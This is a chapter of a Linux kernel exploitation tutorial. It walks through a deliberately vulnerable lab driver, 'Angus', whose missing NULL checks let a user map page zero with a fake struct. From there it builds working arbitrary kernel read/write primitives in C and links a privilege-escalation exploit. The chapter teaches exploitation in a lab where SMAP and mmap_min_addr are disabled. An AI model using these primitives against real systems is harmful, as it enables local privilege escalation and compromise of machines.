---
title: NULL Pointer Dereference
tags:
    - [Linux]
    - [Kernel]
    - [NULL Pointer Dereference]
lang: en
permalink: /en/linux-kernel/LK02/null_ptr_deref.html
pagination: true
bk: ../LK01/race_condition.html
fd: ../LK03/double_fetch.html
---
Most of the core knowledge required for kernel exploitation was already covered in LK01. From here on, we focus on techniques specific to kernel space and attacks against Linux kernel features.
In LK02 (Angus), we learn how to exploit a NULL pointer dereference in kernel space. First download [the LK02 practice files](distfiles/LK02.tar.gz).

## About the vulnerability in this chapter
If you inspect the QEMU startup options for LK02, you will notice that SMAP is disabled on the target machine. The NULL pointer dereference in this chapter is not exploitable unless SMAP is disabled.

Also, boot the challenge kernel and run:
```
$ cat /proc/sys/vm/mmap_min_addr
0
```
[`mmap_min_addr`](https://elixir.bootlin.com/linux/v5.17.1/source/security/min_addr.c#L8) is a Linux kernel variable that limits the lowest address that userland may map with `mmap`. Normally it is nonzero, but in this challenge it is set to `0`. This mitigation was introduced in Linux 2.6.23 specifically to make NULL pointer dereference bugs harder to exploit.

So the attack in this chapter assumes that mitigations such as SMAP and low-address mapping restrictions can be bypassed or are disabled. If you only care about techniques that still apply directly on modern default Linux systems, you may skip this chapter.

## Confirming the vulnerability
Let's begin by reading the LK02 source code in `src/angus.c`.

### `ioctl`
The biggest difference from LK01 is that this driver does not implement `read` or `write`. Instead, it uses an `ioctl` handler.
Calling `ioctl` on the file descriptor causes the matching kernel or driver-side handler to run.
`ioctl` takes two additional arguments besides the file descriptor:
```
ioctl(fd, request, argp);
```
`request` is a request code defined by the device driver. You have to read the source to see which requests the device supports.
`argp` usually points to userland data, which the kernel module reads with `copy_from_user`.

This module expects a structure called `request_t` from userland:
```c
typedef struct {
  char *ptr;
  size_t len;
} request_t;

...

static long module_ioctl(struct file *filp,
                         unsigned int cmd,
                         unsigned long arg) {
  request_t req;
  XorCipher *ctx;

  if (copy_from_user(&req, (void*)arg, sizeof(request_t)))
    return -EINVAL;
```
It also changes behavior depending on the request code:
```c
  switch (cmd) {
    case CMD_INIT:
      if (!ctx)
        filp->private_data = (void*)kzalloc(sizeof(XorCipher), GFP_KERNEL);
      if (!filp->private_data) return -ENOMEM;
      break;

    case CMD_SETKEY:
      ...
      break;

    case CMD_SETDATA:
      ...
```
Before reading the `ioctl` logic in detail, we need to understand `private_data`.

### `struct file`
Userland refers to drivers through file descriptors, but inside the kernel this becomes a [`struct file`](https://elixir.bootlin.com/linux/v5.17.1/source/include/linux/fs.h#L956).
That structure contains file-specific state such as the current offset, but one field is explicitly available for driver-private use:
```c
struct file {
    ...
	/* needed for tty driver, and maybe others */
	void			*private_data;
```
Drivers may store whatever they want there, but they are responsible for allocating and freeing it correctly.
This driver stores a custom structure called `XorCipher`.
```c
static int module_open(struct inode *inode, struct file *filp) {
  filp->private_data = NULL;
  return 0;
}

static int module_close(struct inode *inode, struct file *filp) {
  if (filp->private_data)
    kfree(filp->private_data);
  return 0;
}
...
  switch (cmd) {
    case CMD_INIT:
      if (!ctx)
        filp->private_data = (void*)kzalloc(sizeof(XorCipher), GFP_KERNEL);
      if (!filp->private_data) return -ENOMEM;
      break;
```

<div class="balloon_l">
  <div class="faceicon"><img src="../img/wolf_atamawaru.png" alt="Wolf" ></div>
  <p class="says">
    If Holstein v4 had stored per-open data in `private_data`, its race would have been much harder to trigger.
  </p>
</div>

### Overview of the program
This driver encrypts and decrypts data with an XOR cipher.
It is controlled through `ioctl`, and it exposes the following six request codes:
```c
#define CMD_INIT    0x13370001
#define CMD_SETKEY  0x13370002
#define CMD_SETDATA 0x13370003
#define CMD_GETDATA 0x13370004
#define CMD_ENCRYPT 0x13370005
#define CMD_DECRYPT 0x13370006
```

`CMD_INIT` allocates an `XorCipher` object in `private_data`.
```c
typedef struct {
  char *key;
  char *data;
  size_t keylen;
  size_t datalen;
} XorCipher;
...
    case CMD_INIT:
      if (!ctx)
        filp->private_data = (void*)kzalloc(sizeof(XorCipher), GFP_KERNEL);
      if (!filp->private_data) return -ENOMEM;
      break;
```
The structure stores a key and its length, and data plus its length.

`CMD_SETKEY` copies the user-supplied key into kernel memory. If a key is already present, it frees the old one first.
```c
    case CMD_SETKEY:
      if (!ctx) return -EINVAL;
      if (!req.ptr || req.len > 0x1000) return -EINVAL;
      if (ctx->key) kfree(ctx->key);
      if (!(ctx->key = (char*)kmalloc(req.len, GFP_KERNEL))) return -ENOMEM;

      if (copy_from_user(ctx->key, req.ptr, req.len)) {
        kfree(ctx->key);
        ctx->key = NULL;
        return -EINVAL;
      }

      ctx->keylen = req.len;
      break;
```
Similarly, `CMD_SETDATA` copies plaintext or ciphertext data from userland:
```c
    case CMD_SETDATA:
      if (!ctx) return -EINVAL;
      if (!req.ptr || req.len > 0x1000) return -EINVAL;
      if (ctx->data) kfree(ctx->data);
      if (!(ctx->data = (char*)kmalloc(req.len, GFP_KERNEL))) return -ENOMEM;

      if (copy_from_user(ctx->data, req.ptr, req.len)) {
        kfree(ctx->key);
        ctx->key = NULL;
        return -EINVAL;
      }

      ctx->datalen = req.len;
      break;
```
The encrypted or decrypted data can be copied back to userland with `CMD_GETDATA`:
```c
    case CMD_GETDATA:
      if (!ctx->data) return -EINVAL;
      if (!req.ptr || req.len > ctx->datalen) return -EINVAL;
      if (copy_to_user(req.ptr, ctx->data, req.len)) return -EINVAL;
      break;
```
Finally, `CMD_ENCRYPT` and `CMD_DECRYPT` call the same XOR routine:
```c
long xor(XorCipher *ctx) {
  size_t i;

  if (!ctx->data || !ctx->key) return -EINVAL;
  for (i = 0; i < ctx->datalen; i++)
    ctx->data[i] ^= ctx->key[i % ctx->keylen];
  return 0;
}

...

    case CMD_ENCRYPT:
    case CMD_DECRYPT:
      return xor(ctx);
```

### Investigating the bug
At first glance, the driver has no obvious buffer overflow or use-after-free.
The subtle bug is a NULL pointer dereference in the encryption/decryption path.

At the beginning of `ioctl`, the module loads `private_data` into an `XorCipher *`:
```c
  ctx = (XorCipher*)filp->private_data;
```
For `CMD_SETKEY` and similar requests, it checks that `private_data` has been initialized:
```c
if (!ctx) return -EINVAL;
```
But those checks are missing for `CMD_GETDATA`, `CMD_ENCRYPT`, and `CMD_DECRYPT`:
```c
long xor(XorCipher *ctx) {
  size_t i;

  if (!ctx->data || !ctx->key) return -EINVAL; // no NULL check for ctx
  for (i = 0; i < ctx->datalen; i++)
    ctx->data[i] ^= ctx->key[i % ctx->keylen];
  return 0;
}
...
    case CMD_GETDATA:
      if (!ctx->data) return -EINVAL; // no NULL check for ctx
      if (!req.ptr || req.len > ctx->datalen) return -EINVAL;
      if (copy_to_user(req.ptr, ctx->data, req.len)) return -EINVAL;
      break;

    case CMD_ENCRYPT:
    case CMD_DECRYPT:
      return xor(ctx);
```
So if we reach those paths without initializing `private_data`, the driver dereferences an uninitialized `XorCipher`, which is in practice a `NULL` pointer.

### Confirming the bug
First, let's exercise the driver normally. It is convenient to wrap each request code in a helper function:
```c
int angus_init(void) {
  request_t req = { NULL };
  return ioctl(fd, CMD_INIT, &req);
}
int angus_setkey(char *key, size_t keylen) {
  request_t req = { .ptr = key, .len = keylen };
  return ioctl(fd, CMD_SETKEY, &req);
}
int angus_setdata(char *data, size_t datalen) {
  request_t req = { .ptr = data, .len = datalen };
  return ioctl(fd, CMD_SETDATA, &req);
}
int angus_getdata(char *data, size_t datalen) {
  request_t req = { .ptr = data, .len = datalen };
  return ioctl(fd, CMD_GETDATA, &req);
}
int angus_encrypt() {
  request_t req = { NULL };
  return ioctl(fd, CMD_ENCRYPT, &req);
}
int angus_decrypt() {
  request_t req = { NULL };
  return ioctl(fd, CMD_ENCRYPT, &req);
}
```
For example, let's encrypt and decrypt `"Hello, World!"` with the key `"ABC123"`:
```c
int main() {
  unsigned char buf[0x10];
  fd = open("/dev/angus", O_RDWR);
  if (fd == -1) fatal("/dev/angus");

  angus_init();
  angus_setkey("ABC123", 6);
  angus_setdata("Hello, World!", 13);

  angus_encrypt();
  angus_getdata(buf, 13);
  for (int i = 0; i < 13; i++) {
    printf("%02x ", buf[i]);
  }
  putchar('\n');

  angus_decrypt();
  angus_getdata(buf, 13);
  for (int i = 0; i < 13; i++) {
    printf("%02x ", buf[i]);
  }
  putchar('\n');

  close(fd);
  return 0;
}
```
If encryption and decryption work, the driver is behaving normally.

<center>
  <img src="img/angus_usage.png" alt="Normal use of the Angus module" style="width:320px;">
</center>

Now try encrypting without initializing `XorCipher`:
```c
int main() {
  fd = open("/dev/angus", O_RDWR);
  if (fd == -1) fatal("/dev/angus");

  //angus_init();
  angus_encrypt();

  close(fd);
  return 0;
}
```
When you run this, the kernel should panic like this:

<center>
  <img src="img/angus_crash.png" alt="Crash output" style="width:640px;">
</center>

The BUG line says `kernel NULL pointer dereference, address: 0000000000000008`, confirming exactly the behavior we identified. NULL pointer dereferences also happen in userland, but there they are usually not exploitable. So why is this one exploitable for LPE?

## Virtual memory and `mmap_min_addr`
According to the [Linux memory layout documentation](https://www.kernel.org/doc/Documentation/x86/x86_64/mm.txt), different virtual address ranges are used for different purposes. For example, `0000000000000000` through `00007fffffffffff` belongs to userland. Meanwhile, `ffffffff80000000` through `ffffffff9fffffff` is a kernel data region.

<div class="balloon_l">
  <div class="faceicon"><img src="../img/wolf_normal.png" alt="Wolf" ></div>
  <p class="says">
    On Linux, 48-bit virtual addresses are sign-extended to 64 bits. That is why the range from `0x800000000000` to `0xffff7fffffffffff` is non-canonical and therefore invalid as an address.
  </p>
</div>

The key point is that `0000000000000000` through `00007fffffffffff` is userland.
That means if address `0` is mapped, dereferencing a NULL pointer will not automatically segfault; the code may instead read or write attacker-controlled data placed at page zero.

In kernel space, if SMAP is disabled, the kernel may read userland memory during a NULL pointer dereference. So an attacker can intentionally place fake data at address `0` and make the kernel use it.

Normally, passing `0` as the first argument to `mmap` lets the kernel choose the address. But with `MAP_FIXED`, `mmap` must place the mapping exactly at the requested address or fail. That lets us map page zero directly. Since KPTI is enabled, remember to include `MAP_POPULATE` as well.
```c
mmap(0, 0x1000, PROT_READ|PROT_WRITE,
     MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE,
     -1, 0);
```

This works on the challenge machine, but it will usually fail on a normal Linux system. That is because of the mitigation variable `mmap_min_addr`:
```
$ cat /proc/sys/vm/mmap_min_addr
65536
```
Userland may not map memory below that address. That is why NULL pointer dereference is normally unexploitable. But in this challenge, `mmap_min_addr` is `0`, so the attack becomes possible.

## Privilege escalation
Because the driver dereferences an `XorCipher` through a NULL pointer, the attacker can prepare a fake `XorCipher` object at address `0`.
```c
typedef struct {
  char *key;
  char *data;
  size_t keylen;
  size_t datalen;
} XorCipher;
```

If we control `data` and `datalen`, `CMD_GETDATA` can read arbitrary kernel addresses. If we control `data`, `datalen`, `key`, and `keylen` appropriately, we can also overwrite arbitrary kernel memory.

So this single bug gives us a very strong AAR/AAW primitive. `CMD_GETDATA` uses `copy_to_user` to move data from kernel space into userland:
```c
if (copy_to_user(req.ptr, ctx->data, req.len)) return -EINVAL;
```
Functions such as `copy_to_user` and `copy_from_user` are designed to fail safely rather than crashing when given invalid addresses. So even with KASLR enabled, you can probe potential kernel addresses until `copy_to_user` succeeds.

In any case, let's first build AAR/AAW and verify the implementation by reading and writing userland data:
```c
XorCipher *nullptr = NULL;

void AAR(char *dst, char *src, size_t len) {
  nullptr->data = src;
  nullptr->datalen = len;
  angus_getdata(dst, len);
}

void AAW(char *dst, char *src, size_t len) {
  // Since xor is used for AAW, first read the original data
  char *tmp = (char*)malloc(len);
  if (tmp == NULL) fatal("malloc");
  AAR(tmp, dst, len);

  // Adjust so that xor produces the desired bytes
  for (size_t i = 0; i < len; i++)
    tmp[i] ^= src[i];

  // Write
  nullptr->data = dst;
  nullptr->datalen = len;
  nullptr->key = tmp;
  nullptr->keylen = len;
  angus_encrypt();

  free(tmp);
}

int main() {
  fd = open("/dev/angus", O_RDWR);
  if (fd == -1) fatal("/dev/angus");

  // Prepare a fake XorCipher at the NULL page
  if (mmap(0, 0x1000, PROT_READ|PROT_WRITE,
           MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE|MAP_POPULATE,
           -1, 0) != NULL)
    fatal("mmap");

  // Test AAR/AAW
  char buf[0x10];
  AAR(buf, "Hello, World!", 13);
  printf("AAR: %s\n", buf);
  AAW(buf, "This is a test", 14);
  printf("AAW: %s\n", buf);

  close(fd);
  return 0;
}
```
The AAR/AAW primitive works.

<center>
  <img src="img/angus_aaraaw.png" alt="Building the AAR/AAW primitive" style="width:280px;">
</center>

From there, you can leak the kernel base, search for the `cred` structure, and use any privilege-escalation route you like. A sample exploit is available [here](exploit/angus_exploit.c).

<center>
  <img src="img/angus_privesc.png" alt="Privilege escalation" style="width:320px;">
</center>

[^1]: Naturally, if a module wants to support `lseek`, it must also implement that handler correctly on the kernel side.

----

<div class="column" title="Exercise">
  Experiment with ways to find the <code>cred</code> structure, recover the kernel base address, and so on. Which technique is fastest on average? What are the pros and cons of each method?
</div>
